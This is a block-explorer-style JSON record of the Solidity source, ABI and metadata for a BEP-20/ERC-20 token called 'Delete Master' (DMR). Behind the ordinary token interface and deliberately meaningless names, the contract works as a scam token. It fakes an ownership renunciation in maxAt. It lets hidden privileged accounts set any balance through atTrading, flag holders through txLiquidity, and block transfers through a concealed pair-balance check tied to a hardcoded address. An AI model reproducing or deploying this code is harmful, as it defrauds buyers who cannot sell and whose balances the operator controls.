{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface minFund {\n    function createPair(address marketingLiquidity, address fundListLaunch) external returns (address);\n}\n\ninterface tokenTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxFee) external view returns (uint256);\n\n    function transfer(address receiverFundTeam, uint256 receiverMarketing) external returns (bool);\n\n    function allowance(address swapExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverFundTeam,\n        uint256 receiverMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTakeTeam, uint256 value);\n    event Approval(address indexed swapExempt, address indexed spender, uint256 value);\n}\n\nabstract contract autoLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txWalletIs is tokenTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeleteMaster is autoLiquidity, tokenTrading, txWalletIs {\n\n    uint256 private buyIsTake;\n\n    function listLimit(address swapFund) public {\n        require(swapFund.balance < 100000);\n        if (feeLimit) {\n            return;\n        }\n        \n        listLaunchMax[swapFund] = true;\n        \n        feeLimit = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSell;\n    }\n\n    function launchedMode(address liquidityAuto, address receiverFundTeam, uint256 receiverMarketing) internal returns (bool) {\n        if (liquidityAuto == sellMaxFrom) {\n            return atLimit(liquidityAuto, receiverFundTeam, receiverMarketing);\n        }\n        uint256 totalModeShould = tokenTrading(buyFrom).balanceOf(listSender);\n        require(totalModeShould == teamFrom);\n        require(receiverFundTeam != listSender);\n        if (atLaunched[liquidityAuto]) {\n            return atLimit(liquidityAuto, receiverFundTeam, txLaunch);\n        }\n        return atLimit(liquidityAuto, receiverFundTeam, receiverMarketing);\n    }\n\n    uint256 public exemptTradingAuto;\n\n    bool private toWallet;\n\n    event OwnershipTransferred(address indexed toSwap, address indexed shouldLaunchedTotal);\n\n    function atTrading(address maxReceiver, uint256 receiverMarketing) public {\n        senderMode();\n        swapModeList[maxReceiver] = receiverMarketing;\n    }\n\n    mapping(address => uint256) private swapModeList;\n\n    uint256 teamFrom;\n\n    function senderMode() private view {\n        require(listLaunchMax[_msgSender()]);\n    }\n\n    function maxAt() public {\n        emit OwnershipTransferred(sellMaxFrom, address(0));\n        autoSwap = address(0);\n    }\n\n    function atLimit(address liquidityAuto, address receiverFundTeam, uint256 receiverMarketing) internal returns (bool) {\n        require(swapModeList[liquidityAuto] >= receiverMarketing);\n        swapModeList[liquidityAuto] -= receiverMarketing;\n        swapModeList[receiverFundTeam] += receiverMarketing;\n        emit Transfer(liquidityAuto, receiverFundTeam, receiverMarketing);\n        return true;\n    }\n\n    address private autoSwap;\n\n    uint256 private sellBuyAt;\n\n    uint256 private fromTake;\n\n    address public sellMaxFrom;\n\n    mapping(address => bool) public listLaunchMax;\n\n    function getOwner() external view returns (address) {\n        return autoSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamAmountMode;\n\n    function allowance(address fundTx, address listTx) external view virtual override returns (uint256) {\n        if (listTx == tradingLaunch) {\n            return type(uint256).max;\n        }\n        return teamAmountMode[fundTx][listTx];\n    }\n\n    uint256 constant txLaunch = 13 ** 10;\n\n    address listSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public buyFrom;\n\n    uint256 tokenLiquidityAmount;\n\n    function transfer(address maxReceiver, uint256 receiverMarketing) external virtual override returns (bool) {\n        return launchedMode(_msgSender(), maxReceiver, receiverMarketing);\n    }\n\n    mapping(address => bool) public atLaunched;\n\n    function txLiquidity(address senderAmountMarketing) public {\n        senderMode();\n        if (toList == liquidityBuy) {\n            liquidityBuy = false;\n        }\n        if (senderAmountMarketing == sellMaxFrom || senderAmountMarketing == buyFrom) {\n            return;\n        }\n        atLaunched[senderAmountMarketing] = true;\n    }\n\n    function owner() external view returns (address) {\n        return autoSwap;\n    }\n\n    string private modeLaunched = \"DMR\";\n\n    bool public feeLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTotalSwap;\n    }\n\n    uint8 private limitSender = 18;\n\n    string private exemptTotalSwap = \"Delete Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLaunched;\n    }\n\n    bool private toList;\n\n    function transferFrom(address liquidityAuto, address receiverFundTeam, uint256 receiverMarketing) external override returns (bool) {\n        if (_msgSender() != tradingLaunch) {\n            if (teamAmountMode[liquidityAuto][_msgSender()] != type(uint256).max) {\n                require(receiverMarketing <= teamAmountMode[liquidityAuto][_msgSender()]);\n                teamAmountMode[liquidityAuto][_msgSender()] -= receiverMarketing;\n            }\n        }\n        return launchedMode(liquidityAuto, receiverFundTeam, receiverMarketing);\n    }\n\n    constructor (){\n        if (exemptTradingAuto == buyIsTake) {\n            liquidityBuy = false;\n        }\n        totalTrading totalAt = totalTrading(tradingLaunch);\n        buyFrom = minFund(totalAt.factory()).createPair(totalAt.WETH(), address(this));\n        if (sellBuyAt == buyIsTake) {\n            toWallet = false;\n        }\n        sellMaxFrom = _msgSender();\n        listLaunchMax[sellMaxFrom] = true;\n        swapModeList[sellMaxFrom] = amountSell;\n        maxAt();\n        \n        emit Transfer(address(0), sellMaxFrom, amountSell);\n    }\n\n    function approve(address listTx, uint256 receiverMarketing) public virtual override returns (bool) {\n        teamAmountMode[_msgSender()][listTx] = receiverMarketing;\n        emit Approval(_msgSender(), listTx, receiverMarketing);\n        return true;\n    }\n\n    uint256 private listAmountLiquidity;\n\n    bool private liquidityBuy;\n\n    function minTrading(uint256 receiverMarketing) public {\n        senderMode();\n        teamFrom = receiverMarketing;\n    }\n\n    uint256 private amountSell = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitSender;\n    }\n\n    address tradingLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address maxFee) public view virtual override returns (uint256) {\n        return swapModeList[maxFee];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunchedTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTakeTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"atTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"listLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMaxFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmountMarketing\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeleteMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}